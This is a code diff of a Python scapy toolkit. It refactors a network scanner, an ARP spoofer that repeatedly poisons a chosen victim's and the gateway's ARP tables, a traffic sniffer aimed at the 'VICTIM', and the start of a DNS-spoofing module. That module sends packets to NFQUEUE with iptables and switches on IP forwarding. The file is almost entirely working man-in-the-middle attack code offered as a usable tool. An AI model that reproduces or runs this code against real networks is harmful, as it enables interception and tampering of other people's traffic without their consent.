@@ -60,7 +60,7 @@ def get_cidr():
         print("[---] ERROR! Could not read the CIDR")
         sys.exit()
 
-def scan(ip, only_ip):
+def scan_the_network(ip, only_ip=False):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
@@ -89,11 +89,11 @@ def print_host_list(host_list, ip=True, mac=True):
             print(host["ip"])
 
 # THE MAIN FUNCTION TO SCAN THE NETWORK <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-def network_scanner(only_ip=False):
-    return scan(get_cidr(), only_ip)
+def network_scanner(only_ip):
+    return scan_the_network(get_cidr(), only_ip)
 # ================================= /For network_scanner ========================================
 # ================================= For arp_spoofing ========================================
-def linux_presettings():
+def presettings():
     subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
 
 def get_gateway_ip():
@@ -101,7 +101,7 @@ def get_gateway_ip():
     gateway_ip = re.search(r"(?<=via ).*(?= dev)", str(result))
     return gateway_ip.group(0)
 
-def get_mac(ip):
+def get_mac_by_ip(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
@@ -110,118 +110,128 @@ def get_mac(ip):
 
     return answered_list[0][1].hwsrc
 
-def spoof(victim_ip_list, spoof_ip_list):
+def spoof_arp_tables(victim_ip_list, spoof_ip_list):
     if isinstance(victim_ip_list, list):
         for victim_ip in victim_ip_list:
-            victim_mac = get_mac(victim_ip)
+            victim_mac = get_mac_by_ip(victim_ip)
             packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip_list)
             scapy.send(packet, verbose=False)
     elif isinstance(spoof_ip_list, list):
-        victim_mac = get_mac(victim_ip_list)
+        victim_mac = get_mac_by_ip(victim_ip_list)
         for spoof_ip in spoof_ip_list:
             packet = scapy.ARP(op=2, pdst=victim_ip_list, hwdst=victim_mac, psrc=spoof_ip)
             scapy.send(packet, verbose=False)
     else:
-        victim_mac = get_mac(victim_ip_list)
+        victim_mac = get_mac_by_ip(victim_ip_list)
         packet = scapy.ARP(op=2, pdst=victim_ip_list, hwdst=victim_mac, psrc=spoof_ip_list)
         scapy.send(packet, verbose=False)
 
-def restore(dst_ip_list, src_ip_list):
+def restore_arp_tables(dst_ip_list, src_ip_list):
     if isinstance(dst_ip_list, list):
-        src_mac = get_mac(src_ip_list)
+        src_mac = get_mac_by_ip(src_ip_list)
         for dst_ip in dst_ip_list:
-            dst_mac = get_mac(dst_ip)
+            dst_mac = get_mac_by_ip(dst_ip)
             packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip_list, hwsrc=src_mac)
             scapy.send(packet, count=4, verbose=False)
     elif isinstance(src_ip_list, list):
-        dst_mac = get_mac(dst_ip_list)
+        dst_mac = get_mac_by_ip(dst_ip_list)
         for src_ip in src_ip_list:
-            src_mac = get_mac(src_ip)
+            src_mac = get_mac_by_ip(src_ip)
             packet = scapy.ARP(op=2, pdst=dst_ip_list, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
             scapy.send(packet, count=4, verbose=False)
     else:
-        dst_mac = get_mac(dst_ip_list)
-        src_mac = get_mac(src_ip_list)
+        dst_mac = get_mac_by_ip(dst_ip_list)
+        src_mac = get_mac_by_ip(src_ip_list)
         packet = scapy.ARP(op=2, pdst=dst_ip_list, hwdst=dst_mac, psrc=src_ip_list, hwsrc=src_mac)
         scapy.send(packet, count=4, verbose=False)
 
 # THE MAIN FUNCTION TO SPOOF ARP-TABLES <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 def arp_spoofer():
-    target = raw_input("'one' target or 'everyone'? (by default: everyone): ")
-    linux_presettings()
+    spoof_cmd = raw_input("In you want to spoof just one arp-table - write 'one': ")
+    presettings()
     gateway_ip = get_gateway_ip()
     try:
-        if "one" == target:
-            print_host_list(network_scanner(only_ip=False))
-            target_ip = raw_input("Choose an 'IP' one of them showed above: ")
+        if "one" == spoof_cmd:
+            print_host_list(network_scanner())
+            target_ip = raw_input("Choose an 'IP' showed above: ")
 
             print("Packets sent\tSeconds passed\n------------------------------")
             start = time.time()
             while True:
-                spoof(target_ip, gateway_ip)
-                spoof(gateway_ip, target_ip)
+                spoof_arp_tables(target_ip, gateway_ip)
+                spoof_arp_tables(gateway_ip, target_ip)
                 print("\rTime (in seconds) left: " + str(time.time() - start)),
                 sys.stdout.flush()
                 time.sleep(2)
 
         else:
-            target_ip = network_scanner(only_ip=True)
-
+            target_ip = network_scanner(True)
             print("Packets sent\tSeconds passed\n------------------------------")
             start = time.time()
             while True:
-                spoof(target_ip, gateway_ip)
-                spoof(gateway_ip, target_ip)
+                spoof_arp_tables(target_ip, gateway_ip)
+                spoof_arp_tables(gateway_ip, target_ip)
                 print("\rTime (in seconds) left: " + str(time.time() - start)),
                 sys.stdout.flush()
                 time.sleep(2)
     except KeyboardInterrupt:
         print("\nDetecting 'CTRL+C'... Resetting ARP-tables... Please wait...")
-        restore(target_ip, gateway_ip)
-        restore(gateway_ip, target_ip)
+        restore_arp_tables(target_ip, gateway_ip)
+        restore_arp_tables(gateway_ip, target_ip)
         print("ARP-tables were resetting successfully!")
     except BaseException:
         print("WARNING! Something get wrong!")
-        restore(target_ip, gateway_ip)
-        restore(gateway_ip, target_ip)
+        restore_arp_tables(target_ip, gateway_ip)
+        restore_arp_tables(gateway_ip, target_ip)
         print("ARP-tables were resetting successfully!")
 # ================================= /For arp_spoofing ========================================
 # ================================= For traffic_sniffer ========================================
-def process_sniffed_packet(packet):
+def sniffer_callback(packet):
     print(packet.show())
 
 def sniff(nic):
-    scapy.sniff(iface=nic, store=False, prn=process_sniffed_packet)
+    scapy.sniff(iface=nic, store=False, prn=sniffer_callback)
 
 def traffic_sniffer():
-    nic = raw_input("Write your NIC (example: eth0): ")
+    #>>>>YOU NEED TO PUT HERE ARP SPOOFER WITH CONDITION<<<<<<<<<<<<<
+    nic = raw_input("Write your NIC (examples: 'eth0', 'wlan0'): ")
     sniff(nic)
 # ================================= /For traffic_sniffer ========================================
 
-def get_args():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-c", dest="mac_changer", help="Flag to change the MAC-address (example: -c 1)")
-    parser.add_argument("-cs", dest="network_scanner", help="Flag to scan the connected network (example: -cs 1)")
-    parser.add_argument("-css", dest="arp_spoofer", help="Flag to spoof the VICTIM and the GATEWAY every 2 sec in infinite loop (example: -css 1)")
-    parser.add_argument("-csss", dest="traffic_sniffer", help="Flag to sniff the VICTIM traffic (example: -csss 1)")
-    command = parser.parse_args()
-    if not command:
-        parser.error("Please, specify one of the following flags --> |-c|-cs|-css|-csss|, use --help for more info")
-        if not (command.mac_changer | command.network_scanner | command.arp_spoofer | command.traffic_sniffer):
-            parser.error("WARNING! Incorrect flag, use --help for more info")
-    return command
+# def get_args():
+#     parser = argparse.ArgumentParser()
+#     parser.add_argument("-c", dest="mac_changer", help="Flag to change the MAC-address (example: -c 1)")
+#     parser.add_argument("-cs", dest="network_scanner", help="Flag to scan the connected network (example: -cs 1)")
+#     parser.add_argument("-css", dest="arp_spoofer", help="Flag to spoof the VICTIM and the GATEWAY every 2 sec in infinite loop (example: -css 1)")
+#     parser.add_argument("-csss", dest="traffic_sniffer", help="Flag to sniff the VICTIM traffic (example: -csss 1)")
+#     command = parser.parse_args()
+#     if not command:
+#         parser.error("Please, specify one of the following flags --> |-c|-cs|-css|-csss|, use --help for more info")
+#         if not (command.mac_changer | command.network_scanner | command.arp_spoofer | command.traffic_sniffer):
+#             parser.error("WARNING! Incorrect flag, use --help for more info")
+#     return command
 
-def JUSTDOIT(command):
-    if command.mac_changer:
-        mac_changer()
-    elif command.network_scanner:
-        print_host_list(network_scanner(only_ip=False))
-    elif command.arp_spoofer:
-        arp_spoofer()
-    elif command.traffic_sniffer:
-        traffic_sniffer()
+def cmd_switch():
+    cmd = raw_input(
+        "Choose one of:\n>>> 'm' - mac_changer <<<\n>>> 'n' - network_scanner <<<\n>>> 'a' - arp_spoofer <<<\n>>> 't' - traffic_sniffer <<<\n>>> 'e' - exit <<<\n>>> Write here: ")
+    if "m" == cmd:
+        mac_changer()  # independent
+    elif "n" == cmd:
+        print_host_list(network_scanner())  # independent
+    elif "a" == cmd:
+        arp_spoofer()  # independent
+    elif "t" == cmd:
+        traffic_sniffer()  # independent
+    elif "e" == cmd:
+        sys.exit()
+    return cmd
 
-JUSTDOIT(get_args())
+def JUSTDOIT():
+    cmd = cmd_switch()
+    while cmd not in ["m", "n", "a", "t"]:
+        cmd = cmd_switch()
+
+JUSTDOIT()
 
 ### dns_spoof ###
 def get_args():
@@ -242,8 +252,8 @@ def get_args():
 
 def presets_for_intercept_and_modify_packets(options):
     if options.chain_name1:
-        subprocess.call(["iptables", "-I", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
-    subprocess.call(["iptables", "-I", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])
+        subprocess.call(["iptables", "-A", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
+    subprocess.call(["iptables", "-A", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])
 
 def flush_presets():
     subprocess.call("iptables --flush", shell=True)
